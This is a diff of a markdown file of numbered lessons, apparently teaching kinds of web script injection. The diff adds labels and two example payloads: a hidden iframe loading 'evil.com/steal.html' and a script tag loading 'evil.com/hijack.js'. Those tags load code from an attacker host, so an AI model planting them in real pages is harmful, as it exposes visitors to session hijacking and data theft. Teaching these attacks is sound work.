@@ -20,21 +20,23 @@ From the repository link in the above section, did the following:
 
 ## Lesson 16
 
+Iframe script injection.
+
 ---
 
-<iframe hidden src="https://evil.com:666/steal.html"></iframe>
-
---- created with all content note above.
+## <iframe hidden src="https://evil.com:666/steal.html"></iframe>
 
 ## Lesson 14
 
----
-
-<script src="https://evil.com:666/hijack.js"></script>
+Remote script injection.
 
 ---
+
+## <script src="https://evil.com:666/hijack.js"></script>
 
 ## Lesson 12
+
+Inline script injection.
 
 ---
 
@@ -49,6 +51,8 @@ From the repository link in the above section, did the following:
 ---
 
 ## Lesson 10
+
+Inline script injection.
 
 ---
 
